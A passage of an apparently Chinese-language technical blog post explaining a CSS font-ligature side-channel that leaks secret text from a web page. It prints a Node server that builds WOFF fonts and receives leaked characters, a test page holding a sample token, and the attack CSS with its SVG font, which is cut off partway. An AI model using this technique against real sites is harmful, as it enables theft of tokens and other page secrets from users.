    <span class=nx>fs</span><span class=p>.</span><span class=nx>writeFileSync</span><span class=p>(</span><span class=sb>`</span><span class=si>${</span><span class=nx>tmpobj</span><span class=p>.</span><span class=nx>name</span><span class=si>}</span><span class=sb>/font.svg`</span><span class=p>,</span> <span class=nx>xml</span><span class=p>);</span>
    <span class=nx>child_process</span><span class=p>.</span><span class=nx>spawnSync</span><span class=p>(</span><span class=s2>&#34;/usr/bin/fontforge&#34;</span><span class=p>,</span> <span class=p>[</span>
        <span class=sb>`</span><span class=si>${</span><span class=nx>__dirname</span><span class=si>}</span><span class=sb>/script.fontforge`</span><span class=p>,</span>
        <span class=sb>`</span><span class=si>${</span><span class=nx>tmpobj</span><span class=p>.</span><span class=nx>name</span><span class=si>}</span><span class=sb>/font.svg`</span>
    <span class=p>]);</span>

    <span class=kr>const</span> <span class=nx>woff</span> <span class=o>=</span> <span class=nx>fs</span><span class=p>.</span><span class=nx>readFileSync</span><span class=p>(</span><span class=sb>`</span><span class=si>${</span><span class=nx>tmpobj</span><span class=p>.</span><span class=nx>name</span><span class=si>}</span><span class=sb>/font.woff`</span><span class=p>);</span>
    
    <span class=c1>// Usuwamy katalog tymczasowy.
</span><span class=c1></span>    <span class=nx>rimraf</span><span class=p>.</span><span class=nx>sync</span><span class=p>(</span><span class=nx>tmpobj</span><span class=p>.</span><span class=nx>name</span><span class=p>);</span>

    <span class=c1>// I zwracamy fonta w postaci WOFF.
</span><span class=c1></span>    <span class=k>return</span> <span class=nx>woff</span><span class=p>;</span>
<span class=p>}</span>

<span class=c1>// Endpoint do generowania fontów.
</span><span class=c1></span><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/font/:prefix/:charsToLigature&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
    <span class=kr>const</span> <span class=p>{</span> <span class=nx>prefix</span><span class=p>,</span> <span class=nx>charsToLigature</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>params</span><span class=p>;</span>
    
    <span class=c1>// Dbamy o to by font znalazł się w cache&#39;u.
</span><span class=c1></span>    <span class=nx>res</span><span class=p>.</span><span class=nx>set</span><span class=p>({</span>
        <span class=s1>&#39;Cache-Control&#39;</span><span class=o>:</span> <span class=s1>&#39;public, max-age=600&#39;</span><span class=p>,</span>
        <span class=s1>&#39;Content-Type&#39;</span><span class=o>:</span> <span class=s1>&#39;application/font-woff&#39;</span><span class=p>,</span>
        <span class=s1>&#39;Access-Control-Allow-Origin&#39;</span><span class=o>:</span> <span class=s1>&#39;*&#39;</span><span class=p>,</span>
    <span class=p>});</span>
    
    <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=nx>createFont</span><span class=p>(</span><span class=nx>prefix</span><span class=p>,</span> <span class=nb>Array</span><span class=p>.</span><span class=nx>from</span><span class=p>(</span><span class=nx>charsToLigature</span><span class=p>)));</span>
     
<span class=p>});</span>

<span class=c1>// Endpoint do przyjmowania znaków przez połączenie zwrotne
</span><span class=c1></span><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/reverse/:chars&#34;</span><span class=p>,</span> <span class=kd>function</span><span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>{</span>
    <span class=nx>res</span><span class=p>.</span><span class=nx>cookie</span><span class=p>(</span><span class=s1>&#39;chars&#39;</span><span class=p>,</span> <span class=nx>req</span><span class=p>.</span><span class=nx>params</span><span class=p>.</span><span class=nx>chars</span><span class=p>);</span>
    <span class=nx>res</span><span class=p>.</span><span class=nx>set</span><span class=p>(</span><span class=s1>&#39;Set-Cookie&#39;</span><span class=p>,</span> <span class=sb>`chars=</span><span class=si>${</span><span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>params</span><span class=p>.</span><span class=nx>chars</span><span class=p>)</span><span class=si>}</span><span class=sb>; Path=/`</span><span class=p>);</span>
    <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>();</span>
<span class=p>});</span>

<span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/cookie.js&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
	<span class=nx>res</span><span class=p>.</span><span class=nx>sendFile</span><span class=p>(</span><span class=s1>&#39;js.cookie.js&#39;</span><span class=p>,</span> <span class=p>{</span>
		<span class=nx>root</span><span class=o>:</span> <span class=s1>&#39;./node_modules/js-cookie/src/&#39;</span>
	<span class=p>});</span>
<span class=p>});</span>

<span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/index.html&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
	<span class=nx>res</span><span class=p>.</span><span class=nx>sendFile</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>,</span> <span class=p>{</span>
		<span class=nx>root</span><span class=o>:</span> <span class=s1>&#39;.&#39;</span>
	<span class=p>});</span>
<span class=p>});</span>

<span class=nx>app</span><span class=p>.</span><span class=nx>listen</span><span class=p>(</span><span class=nx>PORT</span><span class=p>,</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
	<span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=sb>`Listening on </span><span class=si>${</span><span class=nx>PORT</span><span class=si>}</span><span class=sb>...`</span><span class=p>);</span>
<span class=p>})</span>
</code></pre></div><p>这里我们先只用到<code>/font</code>的 api 用来直接生成我们需要的 woff 文件，然后我们构造两个页面，第一个 test.html ，包含我们需要获取的 token2 ，有以下代码：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=cp>&lt;!DOCTYPE html&gt;</span>
<span class=p>&lt;</span><span class=nt>html</span> <span class=na>lang</span><span class=o>=</span><span class=s>&#34;en&#34;</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>charset</span><span class=o>=</span><span class=s>&#34;UTF-8&#34;</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;viewport&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;width=device-width, initial-scale=1.0&#34;</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>http-equiv</span><span class=o>=</span><span class=s>&#34;X-UA-Compatible&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;ie=edge&#34;</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>Document<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
        <span class=kd>var</span> <span class=nx>token2</span> <span class=o>=</span> <span class=s2>&#34;7b8a45b8297cf82cc3cefc174c3ae5a1&#34;</span><span class=p>;</span>
    <span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>style</span><span class=p>&gt;</span>
        <span class=p>@</span><span class=k>font-face</span> <span class=p>{</span>
            <span class=nt>font-family</span><span class=o>:</span> <span class=s2>&#34;hack&#34;</span><span class=o>;</span>
            <span class=nt>src</span><span class=o>:</span> <span class=nt>url</span><span class=o>(</span><span class=nt>http</span><span class=o>://</span><span class=nt>172</span><span class=p>.</span><span class=nc>16</span><span class=p>.</span><span class=nc>71</span><span class=p>.</span><span class=nc>138</span><span class=p>:</span><span class=nd>3001</span><span class=o>/</span><span class=nt>font</span><span class=o>/%</span><span class=nt>22</span><span class=o>/</span><span class=nt>7</span><span class=o>);</span>
        <span class=p>}</span>
        <span class=nt>script</span> <span class=p>{</span>
            <span class=k>display</span><span class=p>:</span> <span class=kc>table</span><span class=p>;</span>
            <span class=k>font-family</span><span class=p>:</span> <span class=s2>&#34;hack&#34;</span><span class=p>;</span>
            <span class=k>white-space</span><span class=p>:</span> <span class=kc>nowrap</span><span class=p>;</span>
            <span class=k>background</span><span class=p>:</span> <span class=kc>lightblue</span><span class=p>;</span>
        <span class=p>}</span>
        <span class=nt>body</span><span class=p>::</span><span class=nd>-webkit-scrollbar</span> <span class=p>{</span>
            <span class=k>background</span><span class=p>:</span> <span class=kc>blue</span><span class=p>;</span>
        <span class=p>}</span>
        <span class=nt>body</span><span class=p>::</span><span class=nd>-webkit-scrollbar</span><span class=p>:</span><span class=nd>horizontal</span> <span class=p>{</span>
            <span class=k>display</span><span class=p>:</span><span class=kc>block</span><span class=p>;</span>
            <span class=k>background</span><span class=p>:</span> <span class=kc>blue</span> <span class=nb>url</span><span class=p>(</span><span class=sx>http://127.0.0.1:9999</span><span class=p>);</span>
        <span class=p>}</span>
    <span class=p>&lt;/</span><span class=nt>style</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</code></pre></div><p>我们这里用<code>display:table</code>将<code>script</code>标签内的内容输出出来，然后禁止换行，并使用我们构造的字体。那个 url 获取到的就是以下 svg 生成的 woff 文件：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=cp>&lt;?xml version=&#39;1.0&#39;?&gt;</span>
<span class=nt>&lt;svg&gt;</span>
    <span class=nt>&lt;defs&gt;</span>
        <span class=nt>&lt;font</span> <span class=na>id=</span><span class=s>&#39;hack&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span><span class=nt>&gt;</span>
            <span class=nt>&lt;font-face</span> <span class=na>font-family=</span><span class=s>&#39;hack&#39;</span> <span class=na>units-per-em=</span><span class=s>&#39;1000&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39; &#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;!&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;&#34;&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;#&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;$&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;%&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;&amp;amp;&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;&amp;apos;&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;(&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;)&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;*&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;+&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;,&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;-&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;.&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;/&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;0&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;1&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;2&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;3&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;4&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;5&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;6&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;7&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;8&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;9&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;:&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;;&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;&amp;lt;&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;=&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;&gt;&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;?&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;@&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;A&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;B&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;C&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;D&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;E&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;F&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;G&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;H&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;I&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;J&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;K&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;L&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;M&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;N&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;O&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;P&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;Q&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;R&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;S&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;T&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;U&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;V&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;W&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;X&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;Y&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;Z&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;[&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;\&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;]&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;^&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;_&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;`&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;a&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;b&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;c&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;d&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;e&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;f&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;g&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;h&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;i&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
